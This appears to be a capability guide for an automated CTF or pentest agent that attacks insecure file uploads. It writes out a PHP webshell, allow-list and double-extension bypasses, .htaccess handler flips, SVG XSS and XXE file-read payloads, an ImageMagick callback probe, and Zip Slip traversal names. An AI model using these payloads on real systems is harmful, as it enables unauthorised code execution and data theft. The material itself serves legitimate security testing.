# insecure-file-uploads — when to use

## Dispatch when

- **An HTML form with `enctype="multipart/form-data"` and `<input type="file">`.** A page titled "Image Upload" / "Edit Profile" / "Article Submission" with a file field → this skill applies immediately. This is the single most reliable tell in the class.
- **A field named** `file`, `upload`, `userfile`, `image`, `image_file`, `avatar`, `photo`, `attachment`, `import`, `document`, `media`, `logo`, `banner`, `cv`, `resume`, `proof`, `screenshot` → upload surface, dispatch even when the input is buried inside a multi-step form or a rich-text-editor toolbar.
- **A successful upload that returns the stored path/URL of the file you sent** — `File is valid, and was successfully uploaded` plus a link/`<img src>` to `upload/<yourfilename>`, `{"url":"/uploads/abc.jpg"}`, `Location: /files/123`. The upload directory is web-reachable; dispatch and immediately fetch the file back. If the stored name keeps your extension, server-side execution is one step away — the highest-value condition for this class.
- **The stored file is served from a guessable/incremental path** (`/uploads/1.jpg`, `/media/2024/03/...`, `/u/<userid>/avatar.png`) → retrieval is trivial.
- **A file-type/MIME validator that talks back** — `Invalid Image file. We only support JPG files.`, `Error uploading file!`. A server enforcing a type allow-list is exactly what this skill bypasses; a *talking* validator is a stronger signal than a silent one.
- **The response echoes the original filename** (in JSON, an HTML page, `Content-Disposition`, or a directory listing) → filename is preserved → path-traversal and double-extension games are in scope.
- **The uploaded file is reflected/rendered back into the response** (e.g. a "Current Image:" block that inlines your `<svg>...</svg>`) → the upload feeds a parser whose output you can read → SVG-XXE or stored-XSS via upload.
- **`Content-Type: image/svg+xml` or `text/html` on a file you uploaded**, **`Content-Disposition: inline`** (rather than `attachment`), or **missing `X-Content-Type-Options: nosniff`** → the browser will render uploaded content, so HTML/SVG executes → stored-XSS-via-upload; dispatch here, not generic XSS.
- **Server reflects your `Content-Type` back on retrieval** (send `text/html`, get `text/html`) → MIME is user-controlled → high signal.
- **An error string naming a media tool** — `ImageMagick`, `convert`, `MagickWand`, `Ghostscript`, `gs`, `ExifTool`, `libvips`, `libheif`, `ffmpeg`, `LibreOffice`, `unoconv`, `wkhtmltopdf` → a server-side processor touches the file → toolchain-RCE territory.
- **Upload triggers a thumbnail / preview / PDF-to-image conversion** → a parser runs server-side; even "image-only" endpoints become RCE candidates.
- **A presigned-URL flow** — response contains `X-Amz-Signature`, `x-goog-signature`, an S3/GCS/Azure-blob hostname, or you `POST`/`PUT` directly to `*.amazonaws.com` / `*.blob.core.windows.net` / `storage.googleapis.com` → direct-to-cloud abuse; the server-side validator is likely bypassed entirely.
- **A resumable/chunked protocol** — `tus-resumable` headers, `uploadId` / `?uploads`, `partNumber`, an `init`/`create` → `chunk` → `complete`/`finalize` sequence → finalize-step validation gaps apply.
- **An endpoint that accepts and extracts a `.zip` / `.tar` / `.tar.gz` / `.jar`** (importers, "restore backup", "bulk upload", plugin/theme installers) → Zip Slip / symlink / zip-bomb scope.
- **A "fetch from URL" upload** (`?url=`, `imageUrl`, `import_from`, "upload by link") → SSRF/LFI pivot rides inside the uploader.
- **Client-side-only validation** — the page rejects `.php` in JavaScript but you can replay the POST directly with `curl`/Repeater → validation is cosmetic; dispatch immediately.
- **Server tech that makes uploaded code executable** — `X-Powered-By: PHP`, `Server: Apache` with `.php` handling, IIS/`ASP.NET`, Tomcat/JSP, plus an upload landing inside the web root → web-shell path. PHP + Apache + a reachable `upload/` is the canonical webshell target.
- **A recon link or directory-bust hit naming an upload route** — homepage `<a href="posts/upload-article.php">`, gobuster finding `/upload.php`, `/upload/`, `sku_import.php` → probe the route even before you see the form.
- **An upload/import endpoint naming a serialized/archive format** — `{"status":"failure","message":"Phar file not found."}`, or an endpoint expecting `.phar` / `.ser` / `.pkl` → an upload-then-deserialize chain; own the *upload half* even when the deserialization specialist owns the trigger half.
- **A challenge hint to "Check environment variables"** → the implied win is upload → code execution → `getenv()`/`printenv` for an env-var flag.

## Use-case scenarios

- **PHP webshell via permissive upload (dominant easy case).** A PHP/Apache "Image Upload" form that stores a file under a web-served `upload/` directory and keeps your extension. Upload a `.php`/`.phtml`/`.php5` file containing `<?php system($_GET['x']); ?>`, fetch `http://target/upload/shell.php?x=...`, run commands. Read the flag with `cat /flag.txt`, or `getenv()`/`printenv` when an env-var flag is hinted.
- **Bypassing a file-type allow-list (medium case).** When the validator enforces JPG (checks magic bytes *and* extension), prepend real JPEG structure (`FF D8 FF E0 ... JFIF`) so the structure check passes, but make the **final** extension executable (`shell.jpg.php`) so Apache executes it. The bytes must satisfy the validator *and* land an executable final extension — getting only one is the common failure.
- **Web-root-writable PHP/ASP/JSP apps.** LAMP/IIS/Tomcat targets where uploads land under an executing path. Get an executable extension — or a handler-flipping config (`.htaccess` / `.user.ini` / `web.config`) — past the validator, then request it. Highest impact (RCE).
- **Profile/avatar/document uploads in modern SPAs.** Even with object-storage/CDN serving, weak MIME handling yields stored XSS; the SVG/HTML-served-inline path is common because frameworks default `Content-Type` from the uploaded file or extension.
- **SVG / XML upload as an XXE or stored-XSS sink.** Apps that accept SVG "profile images" and render them back unsanitised are XXE targets: an uploaded SVG declaring an external entity (`<!ENTITY xxe SYSTEM "file:///app/flag.txt">`) and printing `&xxe;` renders the file contents into the page.
- **Media pipelines.** Anything that resizes, thumbnails, watermarks, transcodes, or converts (image hosts, document viewers, "export to PDF", video platforms). The processor (ImageMagick/Ghostscript/ExifTool/ffmpeg/libheif) is a far larger input surface than storage — fingerprint the tool and version, then match the CVE.
- **Bulk importers and archive handlers.** "Import users from CSV", "restore from backup", plugin/theme/extension installers, anything that unzips. Zip Slip writes outside the extraction dir (overwrite config / drop a shell); symlink-in-zip reads arbitrary files; zip-bombs cause DoS.
- **Direct-to-cloud (presigned) uploads.** The browser uploads straight to S3/GCS/Azure via a server-issued presigned URL or POST policy. Loose policy `conditions` (no key-prefix lock, no content-type lock, wide expiry) let you control the object key, content type, and disposition — server-side validation never sees the actual bytes.
- **Resumable/multipart finalize tricks.** tus and S3 multipart split work across `init` → `chunk` → `complete`. If validation only fires at `init`, declare a benign type up front and swap content/metadata at `complete`.
- **Filename as an injection primitive.** Where the filename is shelled out, used in a SQL insert, used to build a path, or passed downstream, the filename field itself carries the payload (command injection, SQLi, path traversal, SSRF via UNC).
- **Upload as the delivery half of a multi-step chain.** The upload is a prerequisite/vehicle, not the whole exploit: behind a SQLi login, in front of an LFI include, or feeding PHAR/pickle deserialization. Own getting crafted bytes onto disk and coordinate with the SQLi / LFI / deserialization specialist for the trigger.
- **Upload gated behind authentication.** When `upload.php` / `dashboard` returns `302 → index.php?error=failed_login`, the surface exists but is locked. Note it, route the auth/SQLi work first; the upload skill becomes live the moment a valid session exists.

## Concrete tells (request → response)

- **Magic-vs-extension probe.** Upload a file whose bytes start with `GIF89a`/`FFD8FFE0...JFIF` but named `x.php`, content-type `image/jpeg`.
  - Stored as `x.php` and served executable → critical (RCE). A `GET /upload/x.php?x=id` returning command output (or `<?php echo 123;?>` returning `123`) confirms.
  - Renamed to a random name but keeping `.php` → still test execution.
  - Rejected → the validator checks extension; move to double-extension / null-byte tricks.
- **Double extension.** `shell.php.jpg`, `shell.jpg.php`, `shell.phtml`, `shell.php5`, `shell.pHp`. Any accepted-and-served-as-PHP → bypass confirmed. Apache `AddHandler`/`mod_mime` misconfig means `shell.php.jpg` can still execute. The `.jpg.php` ordering (executable final extension) is the one that runs; `.php.jpg` is served static.
- **Handler-flip drop.** When only "images" are allowed but you can drop `.htaccess` with `AddType application/x-httpd-php .jpg` (Apache), `.user.ini` with `auto_prepend_file` (PHP-FPM), or `web.config` (IIS) → subsequent "image" uploads execute. An accepted `.htaccess` upload is a strong signal.
- **Webshell reads env-var flag.** Upload `<?php foreach($_ENV as $k=>$v) echo "$k=$v"; ?>` (or `getenv`), GET it → body contains `ENVFLAG=FLAG{...}`. Matches a "Check environment variables" hint.
- **SVG stored-XSS probe.** Upload `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>` as `x.svg`.
  - Retrieved with `Content-Type: image/svg+xml` and `Content-Disposition: inline` → stored XSS fires when viewed.
  - Retrieved as `attachment` with `nosniff` → not exploitable; note it, don't claim a finding.
- **HTML sniff probe.** Upload HTML as `x.png` whose content is `<script>...</script>`. Served without `X-Content-Type-Options: nosniff` → sniffing renders it as HTML.
- **SVG-XXE local file read.** Upload `image=@xxe.svg` = `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]><svg ...><text>&xxe;</text></svg>` → the "Current Image:" block renders the file contents substituted for the entity. First confirm the parser resolves entities with a benign probe (`<!ENTITY xxe "MARKER">` rendering `MARKER`).
- **ImageMagick MVG/SVG probe.** Upload an `.mvg`/`.svg` containing `fill 'url(http://<your-collab>/)'`. An out-of-band HTTP hit to your listener on upload/preview → ImageMagick processing confirmed → escalate toward the `MSL`/`policy.xml`/delegate RCE family.
- **ExifTool probe.** A JPEG with a crafted DjVu/metadata block (CVE-2021-22204 family); a callback or error referencing `ExifTool` → version-match the CVE.
- **Path-traversal filename.** Send `filename="../../../../tmp/poc.txt"` (and URL-encoded `..%2f` variants, `\\` on Windows). File appears at the traversed location, or a stack trace reveals the absolute write path → traversal confirmed.
- **Zip Slip probe.** Upload an archive with an entry named `../../../../tmp/zipslip.txt`. The file lands outside the extraction dir → confirmed.
- **Presigned-policy probe.** Declare `Content-Type: image/png` at policy-request time; at the `PUT`/`POST` to the bucket send `Content-Type: text/html` and a `key` with `../` or a different prefix. Object stored with `text/html` / outside the intended prefix → policy conditions too loose.
- **Finalize swap.** In a tus/S3-MPU flow, `init` with a benign type, then `complete` with a different `Content-Type`/last chunk; if retrieval reflects the swapped type → finalize gap.
- **Phar/import endpoint.** Probing an import route returns `{"status":"failure","message":"Phar file not found."}` → an upload-then-`phar://` chain; pair with `upload.php`/`sku_import.php` enumeration.

## When NOT to use it / easily confused with

- **Acceptance ≠ execution — always fetch the file back to confirm.** "Successfully uploaded" only means storage. The skill's job is not done until a fetched upload proves execution (a marker like `RCE_MARKER:`/`uid=` in the body). A `.php.jpg` that uploads "successfully" but returns `Content-Type: image/jpeg` with raw PHP **uninterpreted** is served static, not executed. Final extension and the server's handler mapping decide execution, not acceptance.
- **A reflected upload is XSS or XXE depending on what the parser does, not "upload RCE".** An SVG reflected into HTML is stored-XSS *unless* the XML parser resolves external entities into local-file reads (then it is XXE). Confirm whether the bytes are *executed as code* or merely *rendered* before claiming RCE.
- **A reflected/stored value in a normal text field (comment, name, bio) → that is XSS, not this skill.** Only route here when the script-bearing content arrives *as an uploaded file* and the upload/serving headers are the weakness.
- **`?url=`/`?path=` that reads a server file with no file *upload* → LFI/path-traversal or SSRF.** Upload-skill owns it only when the traversal/SSRF rides *inside an upload* (filename field, presigned key, URL-fetch uploader).
- **A download/export endpoint that reads arbitrary files (`?file=report.pdf` → `?file=../../etc/passwd`) → path traversal / file disclosure**, not insecure upload — there is no write of attacker content.
- **Generic SSRF where the app fetches a URL for previews but you cannot influence what gets stored/served → prefer the SSRF skill.** Stay here only when the fetched bytes hit a vulnerable media processor or land as a served upload.
- **A pure parser/deserialization bug reached by a non-file body (JSON/XML POST) → deserialization/XXE**, not upload. But when the malicious document arrives *as an uploaded file* (XXE via an uploaded `.docx`/`.svg`, or `.phar`/`.ser`/`.pkl`/`pickle_file`), own the file-landing step and coordinate with the deserialization specialist for the gadget/trigger — don't let a louder SSRF/SSTI lead crowd out the upload half.
- **If the upload route is gated behind login, this is not yet your turn.** A `302 → ?error=failed_login` on `upload.php` means the auth/SQLi specialist must succeed first; note the surface and wait rather than burning budget.
- **A "controlled-ssrf-oracle" / AirPlay-style co-located host service is a distraction, not the upload surface.** When the web app resets connections, do not wander onto co-located host ports (`4455`/`8765` returning `controlled-ssrf-oracle`; macOS AirPlay on `5000`/`7000` answering `AirTunes/...`); stay on the real app's upload form.
- **Uploads provably never served back, or always served `attachment` + `nosniff` from a no-execute store with no processor → likely a false positive.** Don't claim a finding without execution, inline rendering, traversal, or a pipeline race as proof.
- **CSRF on the upload form alone is a different class** — forging the request, not bypassing content/extension/MIME validation.
